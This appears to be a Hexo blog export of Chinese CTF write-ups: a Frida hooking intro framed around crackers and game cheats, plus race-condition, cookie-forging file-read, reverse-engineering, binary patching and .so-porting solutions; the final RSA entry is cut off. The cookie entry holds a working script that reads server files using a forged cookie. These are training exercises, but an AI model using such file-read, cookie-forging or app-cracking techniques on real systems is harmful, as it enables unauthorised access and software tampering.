以上这三个工具可以说是现在用的最多的hook工具了，总结一句话就是写Java层Hook还是Xposed方便，写Native层Hook还是Cydia了，而对于破解者开发那还是Frida最靠谱了。写外挂最难的也是最重要的不是写代码而是寻找hook点，也就是逆向分析app找到那个地方，然后写hook代码实现插件功能。 frida install123pip install frida-tools下载frida-serverhttps://github.com/frida/frida/releases 测试是否安装成功 在terminal中运行cat命令 新开terminal，运行以下代码 12345678910111213141516import fridadef on_message(message, data): print("[on_message] message:", message, "data:", data)session = frida.attach("cat")script = session.create_script("""rpc.exports.enumerateModules = function () &#123; return Process.enumerateModules();&#125;;""")script.on("message", on_message)script.load()print([m["name"] for m in script.exports.enumerate_modules()]) 输出类似如下信息,即说明安装成功 1[u'cat', u'libSystem.B.dylib', u'libcache.dylib', u'libcommonCrypto.dylib', u'libcompiler_rt.dylib', u'libcopyfile.dylib', u'libcorecrypto.dylib', u'libdispatch.dylib', u'libdyld.dylib', u'libkeymgr.dylib', u'liblaunch.dylib', u'libmacho.dylib', u'libquarantine.dylib', u'libremovefile.dylib', u'libsystem_asl.dylib', u'libsystem_blocks.dylib', u'libsystem_c.dylib', u'libsystem_configuration.dylib', u'libsystem_coreservices.dylib', u'libsystem_darwin.dylib', u'libsystem_dnssd.dylib', u'libsystem_info.dylib', u'libsystem_m.dylib', u'libsystem_malloc.dylib', u'libsystem_networkextension.dylib', u'libsystem_notify.dylib', u'libsystem_sandbox.dylib', u'libsystem_secinit.dylib', u'libsystem_kernel.dylib', u'libsystem_platform.dylib', u'libsystem_pthread.dylib', u'libsystem_symptoms.dylib', u'libsystem_trace.dylib', u'libunwind.dylib', u'libxpc.dylib', u'libobjc.A.dylib', u'libc++abi.dylib', u'libc++.1.dylib', u'dyld'] Referhttps://blog.csdn.net/jiangwei0910410003/article/details/80372118 https://www.frida.re/docs/home/]]></content>
      <categories>
        <category>tools</category>
      </categories>
      <tags>
        <tag>android</tag>
        <tag>android hook</tag>
        <tag>android frida</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[记一次简单的条件竞争的题目]]></title>
    <url>%2F%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E7%9A%84%E9%A2%98%E7%9B%AE.html</url>
    <content type="text"><![CDATA[前言 一直对这个漏洞只有概念上的认知，没有做过相关的题目，就找了一个入门的练练手 题目 我们可以控制文件的名字和文件的内容 但是当我们访问的时候去发现访问不到，猜想应该是被删了，这就要利用条件竞争这个漏洞了 概念 创建一个多线程程序不断的向服务器发起请求创建一个文件，在创建一个程序循环读取这个文件 这里使用burp suite进行申请创建文件，写一个死循环读取这个文件 在start attack之前需要先运行访问的脚本 可以得到内容，这题旨在能够访问到这个文件就能拿到flag 总结 Y3RmZXIldTY2MkYldTRFMEQldTY2MkYldTc3MEIldTUyMzBiYXNlJXU1QzMxJXU2MEYzJXU4OUUzJXU0RTAwJXU0RTBCJXU1NDYy]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[cookie欺骗 writeup]]></title>
    <url>%2Fcookie%E6%AC%BA%E9%AA%97-writeup.html</url>
    <content type="text"><![CDATA[Begin 发现filename为keys.txt的base64加密，试着读取index.php文件 发现能读到东西了，接下来读取整个文件 1234567from requests import *from base64 import *for i in range(0,20): url = "http://123.206.87.240:8002/web11/index.php?line=%d&amp;filename=aW5kZXgucGhw"%i respone = get(url=url) print respone.text 1234567891011121314151617181920&lt;?phperror_reporting(0);$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");$line=isset($_GET['line'])?intval($_GET['line']):0;if($file=='') header("location:index.php?line=&amp;filename=a2V5cy50eHQ=");$file_list = array( '0' =&gt;'keys.txt', '1' =&gt;'index.php',);if(isset($_COOKIE['margin']) &amp;&amp; $_COOKIE['margin']=='margin')&#123; $file_list[2]='keys.php';&#125;if(in_array($file, $file_list))&#123; $fa = file($file); echo $fa[$line];&#125;?&gt; 逻辑不难，要求我们将cookie设置成margin=margin，然后在用相同的办法读取keys.php 12345678910from requests import *from base64 import *for i in range(0,20): url = "http://123.206.87.240:8002/web11/index.php?line=%d&amp;filename=%s"%(i,b64encode("keys.php")) header = &#123; "Cookie": "margin=margin" &#125; res = get(url=url,headers=header) print res.text 1&lt;?php $key='KEY&#123;key_keys&#125;'; ?&gt; 得到flag：KEY{key_keys}]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jactf-reverse3]]></title>
    <url>%2F%E6%8E%98%E5%AE%89RE_crypto.html</url>
    <content type="text"><![CDATA[RE_crypto ida 程序逻辑不难，输入的字符作为unk_4021A0数组的下标，定位该下标所对应的值，与((v11 + v12) ^ 0x19)比较，这个值是可以自己算出来的 exp12345678910111213141516171819202122byte1=[0x32,0x61,0x34,0x39,0x66,0x36,0x39,0x63,0x33,0x38,0x33,0x39,0x35,0x63,0x64,0x65,0x39,0x36,0x64,0x36,0x64,0x65,0x39,0x36,0x64,0x36,0x66,0x34,0x65,0x30,0x32,0x35,0x34,0x38,0x34,0x39,0x35,0x34,0x64,0x36,0x31,0x39,0x35,0x34,0x34,0x38,0x64,0x65,0x66,0x36,0x65,0x32,0x64,0x61,0x64,0x36,0x37,0x37,0x38,0x36,0x65,0x32,0x31,0x64,0x35,0x61,0x64,0x61,0x65,0x36]byte = [ 0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76, 0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0, 0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15, 0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75, 0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84, 0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF, 0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8, 0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2, 0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73, 0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB, 0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79, 0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08, 0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A, 0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E, 0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF, 0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16]ans = ""for i in range(0,len(byte1),2): v9 = 0 v10 = 0 if byte1[i] &lt; 48 or byte1[i] &gt; 57: v9 = byte1[i] - 87 else: v9 = byte1[i] - 48 if byte1[i+1] &lt; 48 or byte1[i+1] &gt; 57: v10 = byte1[i+1] - 87 else: v10 = byte1[i+1] - 48 flag = (16*v9+v10) ^ 0x19 for j in range(0,len(byte)): if flag == byte[j]: ans += chr(j)print ans 总结 看了encrypt，只理解了一小部分，后面的部分实在不太明白到底是干嘛，还是太菜了，近几天做的逆向题目，让我深刻认识到密码学、算法(acm)在逆向中的重要地位，一步一个jio印吧……]]></content>
      <categories>
        <category>reverse</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>jactf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[记一次控制流平坦化逆向]]></title>
    <url>%2F%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96%E9%80%86%E5%90%91.html</url>
    <content type="text"><![CDATA[flat 是控制流平坦化的题目 ida 可以分析出函数的5个主要函数 fun_check1(char *a1) 主要作用是检查输入字符串长度 fun_check1(char *a1) 主要作用是检查输入前五个字节是否为flag{ fun_check3(char *a1) 主要作用是检查输入的最后一个字节是否为} fun_check4(char *a1) 主要作用是检查输入的几个特殊部位的值是否为— 输入的字符串进行加密后与字符串进行比较 这就是比较的那个字符串 J2261C63-3I2I-EGE4-IBCC-IE41A5I5F4HB 循环判断输入的每一位是否小于’0’或者大于’9’，如果满足条件，就判断是否等于’-‘，如果等于这个位置的字符就不变，如果大于’a’并且小于’z’，这个位置的字符串就减去48，其余的所有情况都进行将本位置的字符加上17 脚本1234567891011121314151617flag = "J2261C63-3I2I-EGE4-IBCC-IE41A5I5F4HB"print len(flag)strs = ""for i in range(0,len(flag)): for j in range(0,255): temp = "" if j &lt; ord("0") or j &gt; ord("9"): if j == ord("-"): temp = chr(j) elif j &gt;= ord('a') and j &lt;= ord("z"): temp = chr(j-48) else: temp = chr(j+17) if temp == flag[i]: strs += chr(j) breakprint strs]]></content>
      <categories>
        <category>reverse</category>
      </categories>
      <tags>
        <tag>reverse</tag>
        <tag>flat</tag>
        <tag>ollvm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[记一次简单的VM程序逆向]]></title>
    <url>%2F%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84VM%E7%A8%8B%E5%BA%8F%E9%80%86%E5%90%91.html</url>
    <content type="text"><![CDATA[题目来源vm crackme 程序给了三个文件，主要是要求我们通过分析vm1.exe文件的虚拟机，然后自己实现虚拟机，执行ram.bin中的opcode ida分析 程序先申请一个堆，然后将unk_404040copy到Dst中，进而执行sub_4022e0_ 依次取出Dst中的数据，然后调用sub_402270，可知255之后的数据是opcode，255之前的数据是data 这就是opcode执行的主要函数 实现自己的虚拟机1234567891011121314151617181920212223242526272829f = open("./ram.bin","rb")opcode = list(f.read())data = opcode[:0xff]for i in range(0,len(data)): data[i] = ord(opcode[i])def sub_402270(v0,v1,v2): global byte if v0 == 1: data[v1] = v2; print "mov data[%d], 0x%x"%(v1,v2) elif v0 == 2: byte = data[v1] print "mov rax, data[%d]"%v1 elif v0 == 3: data[v1] = data[v1] ^ byte print "xor data[%d], rax"%v1for i in range(0,len(opcode)-257,3): v0 = opcode[255+i] v1 = opcode[256+i] v2 = opcode[257+i] if v0 == 4: break sub_402270(ord(v0),ord(v1),ord(v2))print ''.join(chr(i) for i in data) 执行结果123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384mov data[29], 0xbdmov data[5], 0x53mov data[18], 0x48mov data[16], 0xe6mov data[19], 0x8amov data[13], 0x47mov data[22], 0x13mov data[10], 0x15mov data[0], 0x98mov data[2], 0x3cmov data[24], 0xd9mov data[26], 0x57mov data[6], 0xabmov data[27], 0xc6mov data[1], 0x32mov data[23], 0x20mov data[21], 0x6fmov data[17], 0x2dmov data[8], 0xc9mov data[9], 0xe7mov data[3], 0x12mov data[12], 0x2fmov data[14], 0x88mov data[25], 0x6cmov data[4], 0x65mov data[30], 0xaemov data[20], 0x59mov data[31], 0x91mov data[28], 0x5dmov data[15], 0xaemov data[11], 0x15mov data[7], 0xccmov rax, data[32]xor data[0], raxmov rax, data[33]xor data[1], raxmov rax, data[34]xor data[2], raxmov rax, data[35]xor data[3], raxmov rax, data[36]xor data[4], raxmov rax, data[37]xor data[5], raxmov rax, data[38]xor data[6], raxmov rax, data[39]xor data[7], raxmov rax, data[40]xor data[8], raxmov rax, data[41]xor data[9], raxmov rax, data[42]xor data[10], raxmov rax, data[43]xor data[11], raxmov rax, data[44]xor data[12], raxmov rax, data[45]xor data[13], raxmov rax, data[46]xor data[14], raxmov rax, data[47]xor data[15], raxmov rax, data[48]xor data[16], raxmov rax, data[49]xor data[17], raxmov rax, data[50]xor data[18], raxmov rax, data[51]xor data[19], raxmov rax, data[52]xor data[20], raxmov rax, data[53]xor data[21], raxmov rax, data[54]xor data[22], raxmov rax, data[55]xor data[23], raxmov rax, data[56]xor data[24], raxmov data[25], 0x0FLAG&#123;VMS-ARE-FOR-MALWARE&#125;W�]����~&#125;U��GP���` �.Ae� 总结 第一次逆向vm程序，初次体验了被vm虐哭的感觉]]></content>
      <categories>
        <category>reverse</category>
      </categories>
      <tags>
        <tag>reverse</tag>
        <tag>vm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[so库移植]]></title>
    <url>%2Fso%E5%BA%93%E7%A7%BB%E6%A4%8D.html</url>
    <content type="text"><![CDATA[示例程序 攻防世界 pingpong jadx12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485package com.geekerchina.pingpongmachine;import android.os.Bundle;import android.support.v7.app.AppCompatActivity;import android.view.Menu;import android.view.MenuItem;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.TextView;public class MainActivity extends AppCompatActivity &#123; OnClickListener jping = new OnClickListener() &#123; public void onClick(View v) &#123; if (MainActivity.this.tt % 2 == 1) &#123; MainActivity.this.p = 0; MainActivity.this.num = 0; MainActivity.this.tt = MainActivity.this.ttt; &#125; MainActivity.this.tt--; MainActivity.this.p = MainActivity.this.ping(MainActivity.this.p, MainActivity.this.num); MainActivity.this.num++; if (MainActivity.this.num &gt;= 7) &#123; MainActivity.this.num = 0; &#125; TextView t = (TextView) MainActivity.this.findViewById(R.id.out); t.setText("PING"); if (MainActivity.this.tt == 0) &#123; t.setText("FLAG: BCTF&#123;MagicNum" + Integer.toString(MainActivity.this.p) + "&#125;"); &#125; &#125; &#125;; OnClickListener jpong = new OnClickListener() &#123; public void onClick(View v) &#123; if (MainActivity.this.tt % 2 == 0) &#123; MainActivity.this.p = 0; MainActivity.this.num = 0; MainActivity.this.tt = MainActivity.this.ttt; &#125; MainActivity.this.tt--; MainActivity.this.p = MainActivity.this.pong(MainActivity.this.p, MainActivity.this.num); MainActivity.this.num++; if (MainActivity.this.num &gt;= 7) &#123; MainActivity.this.num = 0; &#125; TextView t = (TextView) MainActivity.this.findViewById(R.id.out); t.setText("PONG"); if (MainActivity.this.tt == 0) &#123; t.setText("FLAG: BCTF&#123;MagicNum" + Integer.toString(MainActivity.this.p) + "&#125;"); &#125; &#125; &#125;; public int num = 0; public int p = 0; public int tt = this.ttt; public int ttt = 1000000; public native int ping(int i, int i2); public native int pong(int i, int i2); /* access modifiers changed from: protected */ public void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView((int) R.layout.activity_main); ((Button) findViewById(R.id.button)).setOnClickListener(this.jping); ((Button) findViewById(R.id.button2)).setOnClickListener(this.jpong); &#125; public boolean onCreateOptionsMenu(Menu menu) &#123; getMenuInflater().inflate(R.menu.menu_main, menu); return true; &#125; public boolean onOptionsItemSelected(MenuItem item) &#123; if (item.getItemId() == R.id.action_settings) &#123; return true; &#125; return super.onOptionsItemSelected(item); &#125; static &#123; System.loadLibrary("pp"); &#125;&#125; 这是主要逻辑需要循环点击ping pong按钮，直到出现flagping pong函数属于native层的函数 so库的两个主要函数，都是经过了混淆，这里可以利用so库移植到别的程序上，通过程序来实现点击按钮的效果，而ping pong函数每次执行都会沉睡1s，1000000s的时间后就会得到flag了，所以我们需要修改so库的sleep函数 另一个函数同理 编写app 创建一个与源程序名称相同的app 将程序中的so库移动到新建的app的libs目录下 修改build.gradle 添加一下代码 1234567891011task nativeLibsToJar(type: Zip, description: "create a jar archive of the native libs") &#123; destinationDir file("$projectDir/libs") baseName "Native_Libs2" extension "jar" from fileTree(dir: "libs", include: "**/*.so") into "lib"&#125;tasks.withType(JavaCompile) &#123; compileTask -&gt; compileTask.dependsOn(nativeLibsToJar)&#125; 修改MainActivity代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354package com.geekerchina.pingpongmachine;import androidx.appcompat.app.AppCompatActivity;import android.os.Bundle;import android.util.Log;import android.widget.Button;import android.widget.TextView;public class MainActivity extends AppCompatActivity &#123; private static final String TAG = "MainActivity"; static &#123; System.loadLibrary("pp"); &#125; public native int ping(int i, int i2); public native int pong(int i, int i2); public void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView((int) R.layout.activity_main); int ttt = 1000000; int num = 0; int tt = ttt; int p = 0; while(true)&#123; if (tt % 2 == 1) &#123; tt--; p = pong(p, num); num++; if (num &gt;= 7) &#123; num = 0; &#125; if (tt == 0) &#123; Log.d(TAG, "BCTF&#123;MagicNum" + Integer.toString(p) + "&#125;"); break; &#125; &#125; else&#123; tt--; p = ping(p, num); num++; if (num &gt;= 7) &#123; num = 0; &#125; if (tt == 0) &#123; Log.d(TAG, "BCTF&#123;MagicNum" + Integer.toString(p) + "&#125;"); break; &#125; &#125; &#125; &#125;&#125; 运行程序 总结 so库移植使用起来，真是能够减少对so层代码的研究，节省时间 Referencehttps://stfpeak.github.io/2017/04/18/bctf-2017-pingpong-writeup/https://blog.csdn.net/JasaLee/article/details/70242837]]></content>
      <categories>
        <category>android</category>
      </categories>
      <tags>
        <tag>android</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[attackworld-gametime]]></title>
    <url>%2Fattackworld-gametime.html</url>
    <content type="text"><![CDATA[gametime ida 定位主函数 打开程序看看 玩几局发现，程序这游戏就行天天炫舞一样，只不过，我们输错了，它就会退出 破解 既然我们输入的不对就会退出，那不如，我们输入对的就会退出，修改代码sub_1381435sub_1381507两函数虽然一样，但是是不同的函数，只修改一个达不到效果 运行破解之后的程序 在需要输入的地方按下回车键就行了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210C:\Users\TideSec\Desktop\ctf&gt;gametime.exe ZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMG ZOMGZOMG ZOMGZOMG ZOMGZOMG TAP TAP REVOLUTION!!!!!!! ZOMGZOMG ZOMGZOMG ZOMGZOMG ZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMG R U READDY?!The game is starting in...Get ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGWhen you see an 's', press the space barZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to play..........sZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGWhen you see an 'x', press the 'x' keyZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to play........xZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGWhen you see an 'm', press the 'm' keyZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to play.....mTRAINING COMPLETE!Now you know everything you need to know....for the rest of your life!LETS PLAY !Get ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to play.....s..x.mooooh, you fancy!!!.....m..x.skey is not (NIIICE JOB)!!!!.....m...s.....m...s....x.....m...s...s...s....xTURBO TIME!key is (no5c30416d6cf52638460377995c6a8cf5).m )(.x )(.m )( key就是要找的flag]]></content>
      <categories>
        <category>reverse</category>
      </categories>
      <tags>
        <tag>gametime</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo next 7.xx添加背景图片]]></title>
    <url>%2Fhexo-next-7-xx%E6%B7%BB%E5%8A%A0%E8%83%8C%E6%99%AF%E5%9B%BE%E7%89%87.html</url>
    <content type="text"><![CDATA[主题配置文件_config.yml 找到custom_file_path，将如图所示的代码取消注释 站点根目录 新建文件source/_data/style.styl 输入相关代码12345678910111213141516171819// 添加背景图片body &#123; background: url(https://source.unsplash.com/random/1600x900?wallpapers);//自己喜欢的图片地址 background-size: cover; background-repeat: no-repeat; background-attachment: fixed; background-position: 50% 50%;&#125;// 修改主体透明度.main-inner &#123; background: #fff; opacity: 0.8;&#125;// 修改菜单栏透明度.header-inner &#123; opacity: 0.8;&#125; 效果]]></content>
      <categories>
        <category>misc</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jactf-reverse2]]></title>
    <url>%2Fjactf-reverse2.html</url>
    <content type="text"><![CDATA[简单的逻辑 ida 关键函数 exp12345678910111213In [5]: flag = list("GEV\odzchpc03")In [6]: s = "" ...: for i in range(0,len(flag)): ...: if i%3 == 0: ...: s += chr(ord(flag[i])^3) ...: elif i%3 == 1: ...: s += chr((ord(flag[i])^3)-1) ...: elif i%3 == 2: ...: s += chr((ord(flag[i])^3)-2) ...: print s ...:DES_key_is_10 12345snake~:./rePlease input your flag:DES_key_is_10you got it!GEV\odzchpc03# 可以得到是des加密，key为10 查看密文是啥 解密 解密网站 真假flag 数学菜鸟在线百度查了下如何求多项式的最大公因式，说是用到了辗转相除法(欧几里得算法),但是好久都没学数学了 在隔壁老阿姨的帮助下，化简了第二个式子g(x) = x^3 + x^2 + x +1 = x^2(x+1) + (x+1) = (x^2 + 1)(x+1)由于第一个公式化简太繁琐，得到解压密码(x+1) ida exp123456789flag = list("lfkmq:b+C~neoyd-~yoog~eho~boxcmb~kdy&#125;oxw")two = list("y0y/|hka~ko??ajtoi")for i in range(0,len(flag)): flag[i] = chr(ord(flag[i])^0xA)for i in range(0,len(two)): two[i] = chr((ord(two[i])^7)-7)print ''.join(i for i in flag)print ''.join(i for i in two) Electroacoustic upx 脱壳12345678910☁ jactf upx -d run Ultimate Packer for eXecutables Copyright (C) 1996 - 2018UPX 3.95 Markus Oberhumer, Laszlo Molnar &amp; John Reiser Aug 26th 2018 File size Ratio Format Name -------------------- ------ ----------- ----------- 913048 &lt;- 402252 44.06% linux/amd64 runUnpacked 1 file. 分析 主要是标注的四个函数,根据函数进行构造输入 exp123456snake~:./run1th input:aaaa2th input:438063th input:9784th input:we11d0ne!Get your key:faded source12☁ jactf file sourcesource: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows dnSpy 定位主函数 主要流程：将输入的字符串进行加密后与key2进行比较 exp1234567891011key1 = list("flag&#123;Thi3_i3+A_wrong+str&#125;")key2 = [24,90,51,23,66,172,49,34,246,240,25,27,224,88,253,50,254,10,7,31,84,5,12,38,15,16,79,117,238]seed = 7flag = ""for i in range(0,len(key2)): for j in range(0,255): if key2[i] == (j + seed ^ ord(key1[seed])) &amp; 0xff: seed = (seed+1)%25 flag +=chr(0x7f &amp; j) breakprint flag reversing ida 将关键跳转修改成如下图所示动态调试即可得到flag disk 思路 一共两个图片，看了一下文件的内容，可以看出来要分析第二张图片 可以在详细信息的备注里看到js的颜文字，直接浏览器 总结 没有目标的明天，是元气满满的一天]]></content>
      <categories>
        <category>reverse</category>
      </categories>
      <tags>
        <tag>jactf</tag>
        <tag>reverse</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jactf-reverse]]></title>
    <url>%2Fjactf-reverse.html</url>
    <content type="text"><![CDATA[平台jactf reverse签到 签到无情，亦有情 re_easy 分析 exp123456789101112131415In [1]: import angrIn [2]: pro = angr.Project("re1")In [3]: pro = angr.Project("re1",auto_load_libs=False)In [4]: sm = pro.factory.simulation_manager(pro.factory.entry_state())In [5]: sm.explore(find=0x40091D,avoid=0x4008FA)Out[5]: &lt;SimulationManager with 1 found, 324 avoid&gt;In [6]: sm.found[0].posix.dumps(0)Out[6]: 'bdctf&#123;YOU_CRAKE_THE_RC4&#125;'In [7]: simplere 分析 我们输入的字符串加密之后与str2比较 关键函数 exp12345678flag = [102,0xA,0x6B,0xC,0x77,0x12,0x21,25,123,78,44,26,41,4,48,82,52,3,46,26,127,93,21,79,86,6,0,31,21,11,85,83,12,0,95,3,85,83,87,7,78,125]for i in range(20,0,-1): flag[i] = flag[i] ^ flag[i-1]for i in range(40,20,-1): flag[i] = flag[i] ^ flag[i+1]print ''.join(chr(i) for i in flag) ELF64 分析 输入的数据md5加密后与780438d5b6e29db0898bc4f0225935c0相比较 somd5 baby_reverse 分析 输入加密比较，没什么可说的 exp12345678flag = list("bIwhroo8cwqgwrxusi")s = ''for i in range(0,len(flag),3): s += chr((ord(flag[i]) ^ 18) - 6) s += chr((ord(flag[i+1]) ^ 18) + 6) s += chr(ord(flag[i+2])^6^18)print s py 找一个在线反编译网站pyc反编译 反编译失败，查看文件头发现少了修改时间于是乎添上，解密得到python代码 1234567891011121314print '[-]Please input your key:'key = raw_input()flag = "=Xm/&gt;*&lt;&amp;?*=+:)k)='@)&lt;.@-n)mZn.&lt;"flags = ''for q in range(len(key)): if q % 2 == 0: flags += chr(ord(key[q]) + 10) continue flags += chr(ord(key[q]) - 10)if flags == flag: print '[-]Good!'else: print '[-]Wrong!' exp12345678910flag = list("=Xm/&gt;*&lt;&amp;?*=+:)k)='@)&lt;.@-n)mZn.&lt;")flags = ''for i in range(0,len(flag)): if i % 2 == 0: flags += chr(ord(flag[i]) - 10) continue flags += chr(ord(flag[i]) + 10)print flags C是最好的语言 难道不是我php是最好的语言吗 分析 exp 符号问题坑死人 1234567891011121314151617181920212223对python还是不太熟悉#include &lt;stdio.h&gt;#include &lt;math.h&gt;int main()&#123; unsigned int v8; int flag[] = &#123;0, 7, 14, 21, 28, 35, 42, 49, 56, 63, 70, 77, 84, 91, 98, 106, 113, 120, 127, 134, 141, 148, 155, 162, 169, 176, 183, 190, 197, 205, 212, 219, 226, 233, 240, 247, 254, 261, 268, 275, 282, 289, 296, 304, 311, 318, 325, 332, 339, 346, 353, 360, 367, 374, 381, 388, 395, 403, 410, 417, 424, 431, 438, 445, 452, 459, 466, 473, 480, 487, 494, 502, 509, 516, 523, 530, 537, 544, 551, 558, 565, 572, 579, 586, 593, 601, 608, 615, 622, 629, 636, 643, 650, 657, 664, 671, 678, 685, 692, 699&#125;; int i,j,k,v9; for(i=0;i&lt;sizeof(flag)/sizeof(int);i++)&#123; for(j=i+1;j&lt;sizeof(flag)/sizeof(int);j++)&#123; for(k=j+1;k&lt;sizeof(flag)/sizeof(int);k++)&#123; v9 = (flag[i]+flag[j]+flag[k])/2; v8 = (unsigned int)((v9-flag[k]) * ((v9-flag[j])*(v9-flag[i])) * v9); v8 = sqrt(v8*1.0); if((v8 - 58792) &lt; 0.1)&#123; printf("%d %d %d \n",flag[i],flag[j],flag[k]); &#125; &#125; &#125; &#125; return 0;&#125; 快下班了,emmm…..]]></content>
      <categories>
        <category>reverse</category>
      </categories>
      <tags>
        <tag>jactf</tag>
        <tag>reverse</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jactf-crypto]]></title>
    <url>%2Fjactf-crypto.html</url>
    <content type="text"><![CDATA[平台jactf crypto签到 exp 贝斯家族三英战群魔！ ciphertext.txt base系列加解密 exp 三种来回试吧 easy_crypto exp 凯撒变异了，从第五天开始学起了仿射 太难了，待做 RSA EXP123456789101112131415161718192021e = 65537n = 96680893262749719063585923605496034909946397522735056426538437328033669985338725407066288126593756516300075860615430875794403057183717504851457447306140156633083633464717665528261926859256017272652664307449953412987821740904604553365689705011743849635723157599918552767507100280395180063522002901593200746511781873994890375020083085611566869100770683695224484271941945294625927525177329833816238993051883827270490888701647400705139719458839603911121670886621461477962756695933517067605502585093263105364157656616569412142054608104328580678323929679979565519112196637759017578061894491053281698814305675705405267996853890146089357120490439497571408105545524052389565330531551774572933411454975669533417114287608047710507040954477798160215276215461073854016379616429522281024330905150309086667463444035922619253072463547705157651517986446117491197566716259728676907938066078264795294480859631047697393915618747207695293572824906113748188758910397359108287298864195827028516965080379239555636330405629007780145398082209758